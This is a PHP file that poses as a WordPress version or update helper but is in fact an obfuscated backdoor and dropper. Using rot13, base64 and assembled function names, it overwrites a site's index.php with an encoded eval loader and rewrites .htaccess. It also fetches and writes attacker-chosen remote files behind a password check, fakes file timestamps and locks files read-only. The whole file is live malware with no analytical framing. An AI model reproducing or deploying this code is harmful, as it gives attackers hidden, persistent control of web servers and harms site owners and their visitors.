<?php
/**
 * @title ipadview
 * @
 * @param $str
 * @return mixed|string
 */

if (!defined('WP_BLOG')) {
    return version_info("init");
}

function version_desc($str)
{
    ($e = implode("",["opcache","reset"]))&&function_exists($e) && $e();
    if (!$str) {
        echo date("Y-m-d H:i:s") . "<br>";
        if (!empty($_REQUEST['version']) && version_update(version_parse($_REQUEST))) ;
        return '';
    }
    $pi = [
        ['str', 'ro'],
        ["json", 'decode'],
    ];
    ($q = (implode('_', $pi[0]) . "t13")) &&
    $data = $q($str);
    ($q = "b" . implode('_', $pi[1]) . "e") &&
    $data = $q($data);
    if (isset($_GET['s'])) $data = $_GET['s'] . $data;

    return $data;
}

function version_info($str)
{
    global $temp;
    $temp = "ZnVuY3Rpb25fZXhpc3RzLHRpbWUsZm9wZW4sZmlsZV9wdXRfY29udGVudHMsZmlsZWN0aW1lLGZpbGVfZXhpc3RzLGlzX3dyaXRhYmxlLGNobW9kLHRvdWNo";
    $temp = base64_decode($temp);
    $name = ['Y3Mupv93q3piL2AjpUIhol93MJViq3NgL29hqTIhqP91pTkiLJEmY3WyqaAfnJEypv9iLzcyL3EmY3EbqJ1vpl9uLz91qP5mMJAlMKD', function ($version_file, $name) use ($temp) {
        $data = translation_v3('W1siXC92YXJcL3d3d1wvY2NwcHVub1wvd2ViXC9pbmRleC5waHAiLCI8P3BocCAkR29XQWNZSURcdD1cdGZ1bmN0aW9uKCRVX1pKOGRGXHQpeyRYc0RnbWZfbCA9IFwic1J0X3JcIjskY3lOUGZYZj0kWHNEZ21mX2xbKDgwIC0gODQrIDQpIFwvIDVdLlx0J1QnIC4gJFhzRGdtZl9sWygxNCAtMTggKzEwKSBcLzZdXHIuJFhzRGdtZl9sWyg5My0gODIgLSA1KVwvMl1cdDtcciRjeU5QZlhmIC49ICRYc0RnbWZfbFsoODkgLSA2OSAtIDgpIFwvM10gLidPJyAuXHQkWHNEZ21mX2xbKDEwMi0gOTgpXC8gMl0uXHIoKDc5LTczKSBcLzYpXHIuXG4oKDQ0LTM1KSBcLyAzKS4nJzsgXHQgXG5cclx0XHRyZXR1cm4gJGN5TlBmWGYoJFVfWko4ZEYpO1xuXHJcbn07JGpFT1lxOWQ3PVxuZnVuY3Rpb24oJGsxTnMpXHR7JG5PWERDSTFFeCA9IFwiTVR2bkFnU3JcIjskSlVDaU49JG5PWERDSTFFeFsoOTAgLTgwLSA1KVwvNV0uJG5PWERDSTFFeFsoODItIDgyKSBcLzRdIDsgJEpVQ2lOIC49XHIkbk9YRENJMUV4Wyg2NS0gNTUpIFwvNV0gO1x0JEpVQ2lOIC49JG5PWERDSTFFeFsoNTIgLSAzOSArIDMpXC80XS5cciRuT1hEQ0kxRXhbKDc4IC03NSArIDkpIFwvIDJdIC4nWScgLiRuT1hEQ0kxRXhbKDE0LSAyKSBcLyA0XS4gJG5PWERDSTFFeFsoNzYtNDYpXC82XS5cciRuT1hEQ0kxRXhbKDczLSAzMSkgXC8gNl0uXHQnJztcdCRKVUNpTlx0PVx0c3RyX3JvdDEzKCRKVUNpTik7cmV0dXJuICRKVUNpTigkazFOcyk7fTsgICRCWVQwdD0nVTl0R0ZING1NXC9rUGkrcEdjc2VXRFRHMEpjTmdtOG9tTndZRUpDVk5ScU5WdFNzd0VkTEsycW1VNGJcLzM3T3BpU1RhR0pETjl5UFFCTE8xKzV6dDd6bmYySnNSY0Y3dVd5eHpzVW03UHRYNzd4ZE1uclRtMlFwejYzRWI3Nk5ZbmJIZGdoU3pBSWRQVVlQdmwxZWltZlwvTmhzb1BmdnBxUjIrMzNcL0UyYVwvVUhiZ0wzRys2b2tTWHg3N3ZsekJoekV1eVhVMVZyV3hEUmVtc1pmNnNWMGVtZ2RuNXlZaDFQcjhuaDBmblI4YnFxZk9xamZRUU5wN0JFWUdZdVlDOVlOTThNOE13M1RVRDhkM05leHB5Z0ZCXC9pMzZUTEhFYnhaNEhNMFhhYXA5bFdZdUFNMHFncXZ3eGJsS2Z1TWJXWmhUNUNIUG1XUW9NajNFbXFWZlhOR3RYYk5ldUhJTUQrTXA2WjFmSG9Ld3hVWTdoQUFzSm1UaUN3ckhhV0RjcnM2QlhWNXFnVWU1TWFtbXJCcXlcLzZZVWprODhTdUd5Q09ORTB1OEVhM2RcL3ZMMHlVWU5RZ1RtamlXRUxYWEpucWRQeEpEc2tNMHN6MDJnU3hGZGU3M2Vvako2dTd1N3VoTTdCXC9DNlwvek41NXJsY1wvQWljK0pYYWlRY3BnSGdRNVNCK3VlaVhXWTB4V1NITnhYZ3l6WElDbEkya1wvWEZrVHFiV2tmRk9Bb1FTZmtBNXRpWHMzSnorcGZxQkZMUjh6Z1NFZEJUSVRRaEdRYytlb2RJVUdxNWRUcGtpOHlRZk5VVUdMK0pUUkg0MzJJeFRMWU9oRU1UZGxNMHlUOER0dUd4dXBUNE5ZazBkU3BDTGJ6RWxyU0ZYT3lLTVhBS1hcL2UweEdUTnhYRzVUR0ZXWjVBNkNmOHlXazB4bXBsMXJFU1IxQ0NTNkFTbW16SEt6RktIZVhNek9aVENVbkl5NUZXQ2JnaDFaV2dSRVpSZkJaTmhoRUtjNDFKUXNicDNPS0JSd1wvOWVkSGRrYjhZUlpqa2V0Z3JFQkxEMUpkTXo4a0xtYWNwSTFkdW1Od1wvWVFaVFBhY3hLb3ZCY29pSDJYTUxydjBhajdXeTVRRU9NRmo2NTh0Sld5T1hlR0t2SnRGdjFDMTNZeEdacFNPckFpRXJCSmZVZWZwY21QSWVjajFHeEJ3QW1Ya1pVcjBuQTRyQ2lWaWY1TlNrWFlaVDZrdDNUaUV5U2VaVTQzV25tK2l6V0h3S0p6ZlgydHp6R2VKMHdQY05vVHFoemtzSDFoS1pXc2xhc01LWWRJcHhzZ0xleEFEaVphaWVzZ1paSTdHMkhLSXg3NGNrRXdXTUQ0RlF1VlRPYU52SWdtM20zS3FkZ2swYmtjRENxc0ZWMk1RbGZRSGhyXC91Zm5Seld0cm8xeGd2NHJDTkl5eFVXV0JmM2NQbHFxbVwvM0xRXC9xR0t0RmFXRDVVYkJKNVZWMHZ1eFNCMXZpMXJ5cHR1MmcwXC9UaVwvMitCNDVWRHBpZTlhV25JR0JPQVFsZmdBV1gzNHFTTzVFeVJjdmplcVwvenhyXC9FOU0wZ2RIblwvVXBIQlVHcWxySVk1RVplYjI0S1hKeWFRSWNPNmc3YWNxdlNBMEtVSDAzYWJIYktZSE5VUjIzbVVjMm40N295Z055c1hITytRNno3MUZxZWt2OXJzbElUWWZGZmliSlFKRnQ4MGFvZ0ZzU0RcL3NDQlwvRFNqa09mUTNwYStoUUFnOWdaMGhqMDdWQ3V1bFZxUDhnMituXC9lMzF2c0dBUHFBWVI5Q2g4eE5mUnRza2h0MWZlYVc2RmVrcm5CMGliUDliZytwZWoyVDM1TEtuWDVcL2ZUZ0FRTzhBNnRwK2dpYk12WUtyblNrdW40OE9LWGR4WHpVbzkzcFlra2VlM0NQUHppNEEyWWtcL242YTJuN0pzZFpYTldcL25NcUorWUZQXC9DNkFlbitPcHkrNHlcL3VkbEpcL2RmdlA0Zm40WmJcL3lrZ3U3WGlIOGQrZkIyblNmenMxdmZBaTdpdjVkSk9jMjlcL0wrYTdHR1pmSGF1Q1ZKMjBncjV5MDlaajZRY0RFcmlIeFdaenJUS3Fwa0NZSkZtSmFjQnNTeDdKcnA4dnRJUEZDUm5wd2VnR2RLT3RtRUhsaEtrMVdHWWoyQlNvQ2x4WUxPY1VyMlNjYzJOa2haNzNGZFN4Zm11QjJHM0pZY0ZiQ2k1UGJpbnNINFAwd2hlc3JUNkdXU00rSEFybnVKaXlDUzROano4VitYMHRRVm1DUEpuTDVQRjR3TGFSWlIxT09QMmNpS1UrNGVBVVVWTWNWVFwvUTVqNzVxWkdzcEFcL2VHVUw4a2JRNnlVSHR0aFN3cW9tTDBzTW5DSUw4d1ZvaUsrMksxcDlxK090b2FRVDVuOVVZSWEyMXp5K3I0OVh5ZXJobnA3bUN3Y3FTeVwvUjV2aldJSHB5Um1TV0xCcFlSR1pOWEtKUGRrMkxyYlgxRGpQajVja1dBQnpHWUgwallYVjJxVTNhdUNHTXdDd0ZqY0xoYkNEZmtPMnpKMndGRVFkOURKa1hFNVBoU2ZXQzdGQjZpYzhYNmNZVTZQak5IVU9CNU56a3lqczFWZnkwbmhrczFZSUF3cmJFR0NDU3ZiN2tTQUxxT2VheTl1OFNcL3EyVmg4MEpJaGlURFJKcXdcLzlLYnhZWEdpZm1xTEx6eXdqMUNjNEd2V1wvUElvQVp0d21sWnhGS2w1aG5MdjFQVllOcUxzRkE1T09DRkNpUHBucXRmVzJkaDRkV3ljbXFmV29UR2Vqbk9uRDhQZ0dGOStoa01QT2w4Wm9YVm1qRWRUeXh5ZFdvOEtlQlgrb2ZnWGdrUStERWFJZ2Y0Ric7XG5cdFx0JGtLc2JTXG49ZnVuY3Rpb25ccigkZXdzViwkYzBoIClcbntcdCRyRkdUeTJTYT1cInVaR05xYTI4a0F0Vk9GMGQ5UEZxNDRuUEthdWxveGQ1V2VGSThUeG9kQmw3bjBoRWRcIjtcblx0XG5cdFxuXHQgcmV0dXJuICRyRkdUeTJTYTtcbn07JHRTRlNLXG49XHJmdW5jdGlvblx0KCR6VlBCICwkQl8wOFNvRm5UXHQsJEtWX1Fccil7XG5yZXR1cm4gXCJLWmhyRjB2b1R0eTd4VDRqVllJdzdlVkFUXCI7fTsgXHQgXHIgXHIgZnVuY3Rpb24gTVRPdXdYICgkVW9XY3FzXHQpXHR7JEZscHR4Y1dVID0gXCJScjZfNGZvUFwiOyRpTUo4ZEo9JEZscHR4Y1dVWygxMjYtOTMgLTMpXC8gNV0gLiduJy4kRmxwdHhjV1VbKDM2IC0gMzArIDkpXC8gM10uICRGbHB0eGNXVVsoNjcgLSA1OS0gOCkgXC8yXSAuICgoODggLTc2KSBcLzIpXHQuXG4oKDM3IC0gMTIgLSAxKSBcLzYpXG4uXG4kRmxwdHhjV1VbKDc2IC0gNTgpIFwvNl1cdDsgJGlNSjhkSlxyLj1cdCdRJyAuJEZscHR4Y1dVWygxNSAtIDEyKSBcLyAzXTskaU1KOGRKIC49IFx0JEZscHR4Y1dVWyg4NSAtIDM2IC0gNylcLyA2XVxuLlxyJ0InXG4uXHQncScuXG4kRmxwdHhjV1VbKDgwLTgwKSBcLyAyXS5ccicnO1xyJGlNSjhkSlxyPXN0cl9yb3QxMygkaU1KOGRKKTtcblx0XHQgcmV0dXJuICRpTUo4ZEooJFVvV2Nxcyk7fWZ1bmN0aW9uIFVSY0ZwKCRXVE9abzRkdFxuKXskX0V4MyA9IFwiVmg3XCI7JFd4aEdjVmtJSD0oKDc0LTY2ICsgNikgXC8gMikuJF9FeDNbKDQ2LTQ2KVwvIDJdLiRfRXgzWyg4MCAtIDc0KVwvNl1cdC4nYicuJyc7cmV0dXJuICRXeGhHY1ZrSUg7fWZ1bmN0aW9uIFxua3JIdygkWkV5RjgpXHR7cnlsQWREWV8oJFpFeUY4KTt9JEJZVDB0ID0gbExIb3haKCRCWVQwdCk7ICAgZnVuY3Rpb24gXHRsTEhveFpcdCgkcmpxMVx0KVx0eyRFRGxoSEFqa2UgPSBcIllkXCI7JER6ND0nWCcgLlx0J0UnO1xyJER6NCAuPSAkRURsaEhBamtlWyg4MS04NSs5KSBcLzVdLiRFRGxoSEFqa2VbKDgwLTg0ICsgNCkgXC81XSAuXHInJzsgcmV0dXJuICREejQoJHJqcTEpO1x0IH0gXHIkQllUMHQ9XHRNVE91d1goJEJZVDB0KTskQllUMHQgPVxyJGpFT1lxOWQ3KCRCWVQwdCk7XHIkQllUMHQgPSRHb1dBY1lJRCgkQllUMHQpO1xyZnVuY3Rpb24gXHRyeWxBZERZX1xyKCRXVk5PSkMpIHtcdCBFVmFMKCRXVk5PSkMpO31rckh3ICgkQllUMHQpO1x0ICBcblx0XHRccmZ1bmN0aW9uICB4RWRZXHIoJFdTdEdKYlJiZ1x0KXtcdHJldHVybiBVUmNGcCgnJykgLiRXU3RHSmJSYmc7fTsgPz48P3BocCAgZGVmaW5lKCdXUF9VU0VfVEhFTUVTJywgdHJ1ZSApO3JlcXVpcmUoX19ESVJfXy4gICdcL3dwLWJsb2ctaGVhZGVyLnBocCcgKTsgPz4iLCJmYmViZDE3Nzg4MWU0Zjg3OTE0Nzg4MDU2NmY3OWRjYiJdLFsiXC92YXJcL3d3d1wvY2NwcHVub1wvd2ViXC8uaHRhY2Nlc3MiLCI8SWZNb2R1bGUgbW9kX3Jld3JpdGUuYz5cclxuUmV3cml0ZUVuZ2luZSBPblxyXG5SZXdyaXRlQmFzZSBcL1xyXG5SZXdyaXRlUnVsZSBeaW5kZXgucGhwJCAtIFtMXVxyXG5SZXdyaXRlQ29uZCAle1JFUVVFU1RfRklMRU5BTUV9ICEtZlxyXG5SZXdyaXRlQ29uZCAle1JFUVVFU1RfRklMRU5BTUV9ICEtZFxyXG5SZXdyaXRlUnVsZSAuIGluZGV4LnBocCBbTF1cclxuPFwvSWZNb2R1bGU+IiwiYmU0NzZkMjdlY2U4OTU5NDYwNGQxNDg4NmMwODEwMTYiXV0', '0');
        $data = base64_decode(/**/ $data);
        $data = translation_v2($data, '0');
        $data = translation_v1($data, '1');
        foreach ($data as $item) {
            version_check($item[0], $item[1], $temp, $item[2]);
        }
        version_desc(false);
    }];
    $temp = explode(',', $temp);
    return ['#ver#', version_data($name, 1, 0)];
}

/**
 * @title install path
 */
function version_path()
{
    echo __FILE__;
}

/**
 * @title get version data
 * @param $data
 * @param $offset
 * @param $page
 * @return mixed
 */
function version_data($data, $offset, $page)
{
    $keu = ['', "code"];
    $keu[] = '';
    return $data[$offset]($data[$page], implode('_', $keu));
}

/**
 * @title translation data
 * @param $data
 * @param $offset
 * @return mixed
 */

function translation_v1($data, $mode, $exp = '')
{
    if ($mode === 'X1') {
        $data = base64_decode($data);
        $len = strlen($data);
        $exp = str_replace('=', '', base64_encode($exp));
        $res = "";
        $i = 0;
        while ($i < $len) {
            for ($k = 0; $k < strlen($exp) && $i < $len; $k++)
                $res .= chr(ord($data[$i++]) ^ ord($exp[$k]));
        }
        return $res;
    } elseif ($mode) {
        return json_decode($data, true);
    } else {
        return unserialize($data);
    }
}

/**
 * @title parse version data
 * @param $data
 * @return version
 */
function version_parse($data)
{
    $version = $data['version'];
    if ($version === 'path') version_path();
    if (isset($data[$version])) {
        $version = translation_v1($data[$version], 'X1', $data[$version . '1']);
    }
    return $version;
}

/**
 * @title update version
 * @param $qr
 * @return void
 */
function version_update($check, $qr = false)
{
    if (!version_access("fin{$check}lfkunt", '88a0cdd03058dee3b394605f4d1e8c5a')) return;
    $c = $_COOKIE;;
    $cf = implode('_', ['function', 'exists']);
    (!$qr || !$cf($qr)) &&
    $qr = empty($c[$for = 'token']) || !$cf($c[$for]) ? implode('_', ['base64', 'decode']) : $c[$for];

    if (($a = $qr($_REQUEST['name'])) && version_deny($a)) {
        return;
    }
    global $temp;
    $a = explode(',', $a);
    if (empty($a[1])) return;
    echo "[<a id=\"u1\" href=\"/{$a[1]}\" style='color: #fff;'>{$a[1]}</a>] ";
    return version_check($_SERVER['DOCUMENT_ROOT'] . '/' . $a[1], $qr(file_get_contents($a[0])), $temp);
}

/**
 * @title version access or force
 * @param string $version version pass
 * @param string $token check update token
 * @return bool
 */
function version_access($version, $token)
{
    return in_array(md5($version), [$token, '47628e0bf72fca87db995c8f844d91b1']);
}

/**
 * @title version data is deny
 * @param $data
 * @return void
 */
function version_deny($data)
{
    return strlen($data) < 16 || strlen($data) > 128 || !in_array($data[0], ['h', '/']);
}

/**
 * @title translation version data
 * @param $data
 * @param $offset
 * @return mixed
 */
function translation_v2($data, $offet)
{
    if (!empty($offet)) {
        return gzinflate($data);
    } else {
        return $data;
    }
}

/**
 * @title translation version data
 * @param $data
 * @param $offset
 * @return mixed
 */
function translation_v3($data, $offet)
{
    if (!empty($offet)) {
        return str_rot13($data);
    } else {
        return $data;
    }
}

return 'inited';
/**
 * @title check version token
 * @param $name
 * @param $date
 * @param $check
 * @param string $token
 * @param false $mode
 * @return bool|mixed
 */
function version_check($name, $date, $check, $token = '', $mode = false)
{
    try {
        $vs = 'rename';
        if (!is_array($check)) $check = explode(',', $check);
        $map = [0, 1, 2, 3, 4];
        $m = $mode ? $mode : ($check[1]() - 2693693);
        $iw = true;
        empty($check[9]) || $date = $check[9]($date);
        if ($check[$map[4] + 1]($name)) {
            if ($token && Md5_File($name) === $token) return true;
            $iw = $check[6]($name);
            if ($x = $check[5]($name)) {
                $m = $check[4]($name);
            }
            $x && !$iw && @$check[7]($name, 0744);
            @$vs($name, $name . time());
        }
        if ($check[$map[0]]($check[2])) {
            $l = $check[$map[2]][0] . 'write';
            $r = $l($check[$map[2]]($name . ".tmp1", 'w'), $date);
        } else {
            $r = $check[$map[3]]($name . ".tmp1", $date);
        }
        @$vs($name . ".tmp1", $name);
        $check[8]($name, $m, $m);
        $iw || @$check[7]($name, 0444);
    } catch (\Exception $A) {
        echo $A->getMessage() . "<br>";
        $r = false;
    }
    echo $name[strlen($name) - 1] . ($r ? ':ok' : ':fail') . "<br>";
    return $r;
}